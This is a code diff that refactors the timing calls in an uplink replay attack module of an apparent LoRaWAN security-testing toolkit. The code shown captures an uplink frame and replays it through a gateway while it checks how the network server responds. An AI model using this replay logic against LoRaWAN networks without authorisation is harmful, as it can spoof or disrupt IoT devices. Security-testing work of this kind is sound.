@@ -3,7 +3,6 @@
 from __future__ import annotations
 
 import threading
-import time
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import TYPE_CHECKING, Any
@@ -25,7 +24,6 @@ from lora_attack_toolkit.lorawan.mac_commands import (
     decode_device_time_ans,
     encode_mac_commands,
 )
-from lora_attack_toolkit.lorawan.time_utils import interruptible_sleep, unix_to_gps
 
 if TYPE_CHECKING:
     from lora_attack_toolkit.attacks.context import AttackContext
@@ -208,12 +206,12 @@ class UplinkReplayAttack(BaseAttack):
 
     def _run_enhanced(self, ctx: AttackContext, cfg: UplinkReplayConfigV1) -> AttackResult:
         with gateway_lifecycle(ctx.gateway):
-            interruptible_sleep(0.5, ctx.cancel_event)
+            ctx.clock.sleep(0.5, ctx.cancel_event)
             return self._run_enhanced_body(ctx, cfg)
 
     def _run_enhanced_body(self, ctx: AttackContext, cfg: UplinkReplayConfigV1) -> AttackResult:
         # 1. OTAA join
-        t0 = time.monotonic()
+        t0 = ctx.clock.monotonic()
         ctx.logger.info("Performing OTAA join... mono=%.3f", t0)
         if not perform_otaa_join(
             device=ctx.device,
@@ -228,7 +226,7 @@ class UplinkReplayAttack(BaseAttack):
                 error="OTAA join failed",
                 message="OTAA join failed - cannot proceed with replay",
             )
-        join_mono = time.monotonic()
+        join_mono = ctx.clock.monotonic()
         ctx.logger.info("OTAA join successful mono=%.3f", join_mono)
 
         # 2. Wait before first uplink
@@ -237,7 +235,7 @@ class UplinkReplayAttack(BaseAttack):
             cfg.uplink_interval_sec,
             join_mono,
         )
-        interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
+        ctx.clock.sleep(cfg.uplink_interval_sec, ctx.cancel_event)
 
         # 3. Warm-up: send clean uplinks until FCntUp reaches capture_fcnt
         device_time_req_bytes = encode_mac_commands([build_device_time_req()])
@@ -253,7 +251,7 @@ class UplinkReplayAttack(BaseAttack):
                 "waiting_for_capture_fcnt target=%d current=%d mono=%.3f",
                 cfg.capture_fcnt,
                 current_fcnt,
-                time.monotonic(),
+                ctx.clock.monotonic(),
             )
             # Include any pending MAC *Ans from previous iteration.
             with mac_ans_lock:
@@ -267,7 +265,7 @@ class UplinkReplayAttack(BaseAttack):
                 f_opts=f_opts,
             )
             radio_meta = _select_radio_for_uplink(ctx, current_fcnt)
-            tx_mono = time.monotonic()
+            tx_mono = ctx.clock.monotonic()
             ctx.gateway.forward_uplink(frame, radio_meta)
             ctx.capture.capture_uplink(
                 phy_payload=frame,
@@ -307,9 +305,9 @@ class UplinkReplayAttack(BaseAttack):
                 ctx.logger.debug(
                     "uplink_interval_sleep interval_sec=%.3f next_mono=%.3f",
                     remaining_sleep,
-                    time.monotonic() + remaining_sleep,
+                    ctx.clock.monotonic() + remaining_sleep,
                 )
-                interruptible_sleep(remaining_sleep, ctx.cancel_event)
+                ctx.clock.sleep(remaining_sleep, ctx.cancel_event)
 
         # 4. Probe uplink at FCntUp == capture_fcnt
         probe_fcnt = ctx.device.runtime.fcnt_up  # == capture_fcnt
@@ -317,7 +315,7 @@ class UplinkReplayAttack(BaseAttack):
             "waiting_for_capture_fcnt target=%d current=%d mono=%.3f",
             cfg.capture_fcnt,
             probe_fcnt,
-            time.monotonic(),
+            ctx.clock.monotonic(),
         )
         # Combine DeviceTimeReq + any accumulated MAC *Ans (max 15 bytes FOpts).
         with mac_ans_lock:
@@ -331,8 +329,8 @@ class UplinkReplayAttack(BaseAttack):
             f_opts=probe_f_opts,
         )
         probe_radio = _select_radio_for_uplink(ctx, probe_fcnt)
-        tx_mono = time.monotonic()
-        tx_gps = unix_to_gps(time.time())
+        tx_mono = ctx.clock.monotonic()
+        tx_gps = ctx.clock.gps_time()
         ctx.gateway.forward_uplink(frame, probe_radio)
         fcnt_captured = ctx.device.runtime.fcnt_up - 1  # == capture_fcnt
         ctx.capture.capture_uplink(
@@ -364,17 +362,17 @@ class UplinkReplayAttack(BaseAttack):
 
         def _replay_loop() -> None:
             for i in range(cfg.replay_count):
-                next_mono = time.monotonic() + cfg.replay_attempt_interval_sec
+                next_mono = ctx.clock.monotonic() + cfg.replay_attempt_interval_sec
                 ctx.logger.debug(
                     "replay_interval_sleep interval_sec=%.3f next_mono=%.3f",
                     cfg.replay_attempt_interval_sec,
                     next_mono,
                 )
-                interruptible_sleep(cfg.replay_attempt_interval_sec, ctx.cancel_event)
+                ctx.clock.sleep(cfg.replay_attempt_interval_sec, ctx.cancel_event)
                 replay_radio = _select_radio_for_uplink(ctx, captured.fcnt + i)
                 with gateway_lock:
-                    tx_mono = time.monotonic()
-                    tx_gps = unix_to_gps(time.time())
+                    tx_mono = ctx.clock.monotonic()
+                    tx_gps = ctx.clock.gps_time()
                     ctx.gateway.forward_uplink(captured.phy_payload, replay_radio)
                 replay_tx.append(
                     ReplayTxRecord(
@@ -393,13 +391,13 @@ class UplinkReplayAttack(BaseAttack):
 
         def _normal_uplink_loop() -> None:
             for i in range(cfg.verification_uplink_count):
-                sleep_start = time.monotonic()
+                sleep_start = ctx.clock.monotonic()
                 ctx.logger.debug(
                     "uplink_interval_sleep interval_sec=%.3f mono=%.3f",
                     cfg.uplink_interval_sec,
                     sleep_start,
                 )
-                interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
+                ctx.clock.sleep(cfg.uplink_interval_sec, ctx.cancel_event)
                 # Drain accumulated MAC *Ans from _downlink_loop.
                 with mac_ans_lock:
                     ans_snapshot = pending_mac_ans[:]
@@ -414,8 +412,8 @@ class UplinkReplayAttack(BaseAttack):
                 fcnt_before_build = ctx.device.runtime.fcnt_up - 1
                 normal_radio = _select_radio_for_uplink(ctx, fcnt_before_build)
                 with gateway_lock:
-                    tx_mono = time.monotonic()
-                    tx_gps = unix_to_gps(time.time())
+                    tx_mono = ctx.clock.monotonic()
+                    tx_gps = ctx.clock.gps_time()
                     ctx.gateway.forward_uplink(frame, normal_radio)
                 fcnt = ctx.device.runtime.fcnt_up - 1
                 valid_tx.append(
@@ -443,7 +441,7 @@ class UplinkReplayAttack(BaseAttack):
                 raw = ctx.gateway.await_downlink(timeout_sec=0.3)
                 if raw is None:
                     continue
-                mono = time.monotonic()
+                mono = ctx.clock.monotonic()
                 ctx.logger.info("downlink_received mono=%.3f", mono)
                 mac_cmds: list[Any] = []
                 dt_ans = None
@@ -498,12 +496,12 @@ class UplinkReplayAttack(BaseAttack):
         t_dl = threading.Thread(target=_downlink_loop, daemon=True)
 
         ctx.logger.info(
-            "replay_started_after_fcnt=%d mono=%.3f", cfg.capture_fcnt, time.monotonic()
+            "replay_started_after_fcnt=%d mono=%.3f", cfg.capture_fcnt, ctx.clock.monotonic()
         )
         ctx.logger.info(
             "verification_window_started_after_fcnt=%d mono=%.3f",
             cfg.capture_fcnt,
-            time.monotonic(),
+            ctx.clock.monotonic(),
         )
         t_dl.start()
         t_replay.start()
@@ -512,7 +510,7 @@ class UplinkReplayAttack(BaseAttack):
         t_replay.join()
         t_normal.join()
         # Give RX windows time to drain after last TX
-        interruptible_sleep(
+        ctx.clock.sleep(
             max(_DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec, 3.0),
             ctx.cancel_event,
         )
@@ -618,7 +616,7 @@ class UplinkReplayAttack(BaseAttack):
             weak_replay_matches,
             device_time_answers,
             verdict.value,
-            time.monotonic(),
+            ctx.clock.monotonic(),
         )
 
         metrics: dict[str, Any] = {
